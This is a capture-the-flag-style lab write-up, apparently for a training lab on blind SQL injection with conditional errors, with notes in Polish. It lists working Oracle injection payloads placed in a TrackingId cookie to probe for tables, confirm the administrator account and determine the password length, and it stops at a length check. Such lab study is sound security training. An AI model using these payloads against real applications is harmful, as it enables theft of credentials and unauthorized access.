Title: Blind SQL injection with conditional errors
Level: Practitioner
Desc:  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.
The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
To solve the lab, log in as the administrator user. 

payload: `TrackingId=5tHqfwpyNshiWpOW'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
![image](https://github.com/user-attachments/assets/4d10f504-bfee-4519-a541-89bf7f000502)
Wynik: zwraca błąd 

payload: `TrackingId=5tHqfwpyNshiWpOW'||(SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
![image](https://github.com/user-attachments/assets/c5a7e711-e14e-4ce4-8b31-cfaca6717b90)
Wynik: nie zwraca błędu

Weryfikacja istnienia danej tabeli w bazie danych

payload: `TrackingId=5tHqfwpyNshiWpOW'||(SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM usexxxrs where rownum=1)||'`
![image](https://github.com/user-attachments/assets/cd20d3f5-5204-4f73-b0a8-ed2387b36429)
Wynik: zwraca błąd, tabela nie istnieje w bazie

payload: `TrackingId=5tHqfwpyNshiWpOW'||(SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM users where rownum=1)||'`
![image](https://github.com/user-attachments/assets/269752dd-e6ce-4bfc-9f4d-b9859be29ca8)
Wynik: nie zwraca błędu, tabela users istnieje w bazie danych

Weryfikacja, czy użytkownik istnieje:

payload: `TrackingId=5tHqfwpyNshiWpOW'||(SELECT CASE WHEN LENGTH(password)>0 THEN TO_CHAR(1/0) ELSE '' END FROM users where username='adminxistrator')||'`
![image](https://github.com/user-attachments/assets/672b52df-5e4f-4dbf-be56-e4d9f2779493)
Wynik: nie zwraca błędu, użytkownik adminxistrator nie istnieje

payload: `TrackingId=5tHqfwpyNshiWpOW'||(SELECT CASE WHEN LENGTH(password)>0 THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||'`
![image](https://github.com/user-attachments/assets/ed3fabc1-f840-4dbb-9627-1d013a958652)
Wynik: zwraca błąd, administrator istnieje w tabeli users

Weryfikacja długości hasła
payload: `TrackingId=5tHqfwpyNshiWpOW'||(SELECT CASE WHEN LENGTH(password)>0 THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||';`
payload: `TrackingId=5tHqfwpyNshiWpOW'||(SELECT CASE WHEN LENGTH(password)=20 THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||';`




